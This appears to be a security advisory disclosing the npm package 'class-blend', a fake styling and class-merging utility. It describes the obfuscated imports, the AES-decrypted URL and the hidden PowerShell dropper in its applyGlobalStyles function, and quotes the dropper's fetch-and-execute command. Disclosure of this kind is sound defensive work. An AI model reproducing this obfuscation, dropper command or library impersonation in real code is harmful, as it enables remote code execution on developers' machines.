summary: class-blend ships hidden PowerShell RCE dropper behind styling helper API
details: The package advertises itself as a class-merging / styling / date-formatting utility (keywords list mimics clsx, classnames, tailwind-merge, date-fns) and exports familiar names like classNames, twMerge, and formatDate. The exported applyGlobalStyles(theme) function in dist/index.js loads node:crypto and node:child_process via string-split obfuscation (['no','de',':','cry','pto'].join('') and ['no','de',':','child','_','process'].join('')), reconstructs an AES-256-CBC key from an 8-element hex array, and uses theme.palette as ciphertext and theme.accents as IV to decrypt a URL. It then spawns a hidden, detached PowerShell process (windowsHide:true, stdio:'ignore',.unref()) that runs `irm <decrypted-url> -o $env:TEMP\s.js; node $env:TEMP\s.js`, fetching and executing arbitrary attacker-controlled JavaScript on the consumer's Windows machine. Trigger is invocation of the public applyGlobalStyles API — any consumer calling the documented styling helper executes the dropper. The package name and keyword list also impersonate widely-used utility libraries (clsx, classnames, tailwind-merge), targeting developers searching for those tools.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
